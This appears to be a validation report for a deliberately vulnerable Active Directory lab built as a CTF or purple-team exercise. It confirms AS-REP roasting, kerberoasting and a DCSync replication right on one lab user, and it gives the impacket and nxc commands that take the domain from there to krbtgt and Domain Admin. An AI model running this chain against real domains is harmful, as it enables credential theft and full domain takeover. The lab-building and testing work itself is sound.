# Vulnerability validation — pirates-lab

_Confirmed 2026-07-06 against the live lab over the WireGuard tunnel (DC 10.157.1.10, blackpearl.local). Each injected vuln is checked for two things: the config was APPLIED (the AD artifact landed) and it is actually EXPLOITABLE (the attack primitive works). This is not a detection/coverage matrix._

- Config applied: **3/3**
- Exploitable (primitive works): **3/3**
- Manual re-verification: all three were hand-confirmed after the automated `forge.py validate --run` reported false negatives (see the note at the bottom).

## CTF attack chain — single-identity pivot on `Elizabeth_Feng`

`attack_chain.mode: ctf` cast all three weaknesses onto the **same real
population user, `Elizabeth_Feng`** (member of "East India Trading Company",
OU=Tier 0). The chain is therefore a single-identity escalation: recover her
password by roasting, then use her replication rights to own the domain.

1. 🗺️ **`asreproast` (T1558.004)** — steal the captain's map.
2. ⚓ **`kerberoasting` (T1558.003)** — board the ship.
3. 💰 **`dcsync-acl` (T1003.006)** — plunder the treasury → Domain Admin.

## Results

| Vuln | ATT&CK | Host | Applied | Exploitable | Evidence |
|---|---|---|---|---|---|
| asreproast | T1558.004 | dc01 | **YES** | **YES** | `userAccountControl = 4260352` on Elizabeth_Feng → `DONT_REQ_PREAUTH` (0x400000) set. Unauth AS-REP roast returned `$krb5asrep$23$Elizabeth_Feng@BLACKPEARL.LOCAL:…` (RC4), cross-confirmed with both `nxc ldap --asreproast` and `impacket-GetNPUsers -no-pass`. |
| kerberoasting | T1558.003 | dc01 | **YES** | **YES** | `servicePrincipalName = MSSQLSvc/Elizabeth_Feng.blackpearl.local:1433` present. Authenticated TGS request returned `$krb5tgs$18$Elizabeth_Feng$BLACKPEARL.LOCAL$…` (AES256) via `impacket-GetUserSPNs -request-user Elizabeth_Feng -dc-ip 10.157.1.10`. |
| dcsync-acl | T1003.006 | dc01 | **YES** | **YES** | DACL on `DC=blackpearl,DC=local` grants **Elizabeth_Feng** (SID …-1119) both `DS-Replication-Get-Changes` (1131f6aa-…) and `DS-Replication-Get-Changes-All` (1131f6ad-…). With her credentials this yields a full DCSync (krbtgt → golden ticket → Domain Admin). Confirmed via `nxc ldap -M daclread`. |

## Notes / caveats

- **Why `forge.py validate --run` first reported 0/3 (false negatives):**
  - _asreproast / kerberoasting:_ the auto-check surfaced `KDC_ERR_ETYPE_NOSUPP`.
    This is the fully-patched-KDC behaviour documented in
    `AZURE-DEPLOY-RUNBOOK.md` §7 / vuln-injection. The artifacts are present and
    `msDS-SupportedEncryptionTypes = 28` (RC4+AES) is set on the account; the
    primitive works once the request negotiates a supported etype (RC4 for
    AS-REP, AES256 for the TGS), which the manual runs above did.
  - _dcsync-acl:_ correctly flagged `REQUIRES-HUMAN` by design (ACL edges need a
    graph/dacl read); the manual `daclread` above confirms the edge.
  - _kerberoasting DNS:_ `nxc --kerberoasting` needs to resolve the KDC FQDN over
    the tunnel; `impacket-GetUserSPNs -dc-ip 10.157.1.10` bypasses DNS.
- **Password strength caveat:** PurpleForge assigns strong random passwords to
  all population users, so the roast hashes above, while genuine and correctly
  formatted, are **not** practically crackable with a standard wordlist. The
  APPLIED + EXPLOITABLE criteria are about the primitive working (obtaining the
  roastable material / holding the replication right), not about a weak password.
  If this lab is intended as a solvable CTF where players must actually crack the
  roast, set a deliberately weak password on `Elizabeth_Feng` (the chain's pivot
  account) before running it as an exercise.

## Reproduce (over the tunnel, DC = 10.157.1.10, domain = blackpearl.local)

```bash
# 1. asreproast (no creds)
impacket-GetNPUsers 'blackpearl.local/' -dc-ip 10.157.1.10 -no-pass \
  -usersfile <(echo Elizabeth_Feng) -format hashcat

# 2. kerberoasting (any valid domain user; here Administrator)
impacket-GetUserSPNs 'blackpearl.local/Administrator:<PASS>' -dc-ip 10.157.1.10 \
  -request-user Elizabeth_Feng

# 3. dcsync-acl — confirm the replication edge, then (with Elizabeth_Feng's creds) DCSync
nxc ldap 10.157.1.10 -d blackpearl.local -u Administrator -p '<PASS>' -M daclread \
  -o TARGET_DN="DC=blackpearl,DC=local" ACTION=read
impacket-secretsdump 'blackpearl.local/Elizabeth_Feng:<HER-PASS>@10.157.1.10' -just-dc-user krbtgt
```

_Credentials are in `generated/pirates-lab/lab-report.md` (gitignored — never committed)._
